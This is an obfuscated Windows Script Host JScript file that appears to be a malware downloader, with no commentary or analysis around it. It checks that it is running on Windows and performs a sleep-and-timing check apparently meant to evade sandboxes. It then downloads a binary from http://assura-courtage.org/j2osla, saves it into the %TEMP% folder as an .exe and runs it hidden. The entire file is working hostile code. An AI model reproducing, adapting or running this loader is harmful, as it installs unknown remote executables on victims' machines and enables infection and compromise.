var _AF = false;
var _M = "CreateObject";
var _HL = function _SK() {return WScript[_M]("WScript"+".Shell");}(), _LM = 11;
var _C = "MSXML2.XMLHTTP";
var _EJ = 2123213;
var _U = 0;
function _Q(_PJ){_HL["Run"](_PJ, _U, _U);};
function _TZ(){return _C + "";};
function _Z(_O0, _WR){_U = _U * 1; return _O0 - _WR;};
function _FT(){return _M;};
/*@cc_on
  @if (@_win32 || @_win64)
    _AF = true;
  @end
@*/
if (_AF)
{
var _F0 = "";
function _CF(){return 22;};
var _JY = 0; var _K = 0;
function _JO()
{
var _V = new this["Date"]();
var _KG = _V["getUTCMilliseconds"]();
WScript["Sleep"](_CF());
var _V = new this["Date"]();
var _E = _V["getUTCMilliseconds"]();
WScript["Sleep"](_CF());
var _V = new this["Date"]();
var _FT0 = _V["getUTCMilliseconds"]();
var _JY = "_RW";
_JY = _Z(_E, _KG);
var _K = "_CN";
_K = _Z(_FT0, _E);
_F0 = "open";
return _Z(_JY, _K);
}
var _QY = false;
var _AC = false;
for (var _A = _U; _A < _CF() * 1; _A++){if (_JO() != _U){
_QY = true; 
_K = "31" + 11 * _JY + _K; 
_AC = true; 
break;
}}
function _ZO() {return ((_QY == true) && (_QY == _AC)) ? 1 : _U;};
if (_QY && _ZO() && _AC){
function _EN() {return _HL["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "MAmzT9uIewtU.ex" + "e";};
 _QT = _TZ();
 _TT = WScript[_M](_QT);
 var _P = 1;
 while (_P){
try {
	if (_P == 1)
	{
		_TT[_F0]("GET", "http://assura-courtage.org/j2osla", false);
		_TT["send"]();
		_I = "Sleep";
	}
	WScript[_I](_CF() + 120); 
	if (_TT["readystate"] < 2 * 2) continue;
	_P = _U;
	function _F(_J) {var _O = (1, 2, 3, 4, 5, _J); return _O;};
	_MY = WScript[_FT()]("ADODB.Stream");
	_QT = _MY;
	_QT[_F0]();
	_QT["type"] = _F(1);
	_QT["write"](_TT["ResponseBody"]);
	_MY["position"] = _F(_U);
	_QT["Save" + "ToFile"](_EN(), 2);
	_MY["cl"+"ose"]();
	_LH = _EN();
	_Q(_LH);
} catch(_N){};
}
}
}

